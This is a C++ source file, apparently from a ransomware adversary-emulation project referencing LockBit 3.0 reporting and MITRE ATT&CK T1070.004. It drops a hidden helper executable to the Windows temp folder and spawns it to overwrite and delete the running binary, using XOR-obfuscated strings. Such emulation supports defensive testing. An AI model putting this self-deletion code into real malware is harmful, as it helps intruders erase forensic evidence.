#include "crypto/xor_obfuscation.hpp"
#include "defense_evasion.hpp"
#include "execute.hpp"
#include "guardrails.hpp"
#include "logger.hpp"
#include "defense_evasion_resource.hpp"
#include "util/os_util.hpp"
#include "util/resource_util.hpp"
#include "processthreadsapi.h"

#define SELF_DEL_EXE_DEST_PATH XOR_WIDE_LIT(L"C:\\Windows\\Temp\\381jwk.tmp")

namespace defense_evasion {

/*
 * SpawnSelfDestructProcess:
 *      About:
 *          Drops the self-destruct helper executable to disk at C:\Windows\temp\381jwk.tmp and executes it.
 *      Result:
 *          Self destruct current executable.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
bool SpawnSelfDestructProcess() {
    try {
        std::wstring curr_exe_path = os_util::GetCurrExecutablePath();

        // Drop resource to disk
        resource_util::WriteResourceToDisk(SELF_DEL_EXE_RESOURCE_ID, SELF_DEL_EXE_DEST_PATH);

        // Create self destruct process
        wchar_t command_line[MAX_CMD_LINE_LENGTH + 1];
        swprintf_s(command_line, MAX_CMD_LINE_LENGTH, L"\"%s\" -p \"%s\"", SELF_DEL_EXE_DEST_PATH, curr_exe_path.c_str());
        DWORD result = execute::SpawnProcessNoWait(command_line);
        if (result != ERROR_SUCCESS) {
            XorLogger::LogError(std::format("{} {}", XOR_LIT("Failed to start self destruct process: CreateProcessW gave error code"), result));
            return false;
        }
    } catch (std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to start self destruct process"), e.what()));
        return false;
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown error when starting self destruct process."));
        return false;
    }
    return true;
}

/*
 * SelfDestruct:
 *      About:
 *          Releases global mutex handle, spawns the auxiliary process to overwrite, rename, and delete
 *          the current executable, and then terminates the current executable to allow the auxiliary
 *          process to complete the self-destruct routine.
 *          The auxiliary process is stored as a resource and dropped to disk prior to being executed.
 *          File write to disk is performed using the CreateFileW and WriteFile API calls.
 *          Process creation is performed using the CreateProcessW API call.
 *          Process exit is performed using the ExitProcess API call.
 *      Result:
 *          Terminate current executable and spawn self-destruct process.
 *      MITRE ATT&CK Techniques:
 *          T1070.004: Indicator Removal: File Deletion
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *          https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html
 */
void SelfDestruct() {
    // Close global mutex handle
    guardrails::ReleaseMutex();
    XorLogger::LogDebug(XOR_LIT("Released global mutex."));

    // Start auxiliary process to perform self destruct
    XorLogger::LogDebug(XOR_LIT("Starting self-destruct auxiliary process."));
    if (!SpawnSelfDestructProcess()) {
        XorLogger::LogError(XOR_LIT("Failed to start self-destruct auxiliary process."));
    }
    XorLogger::CloseLogger();

    // End process
    ExitProcess(0);
}

} // namespace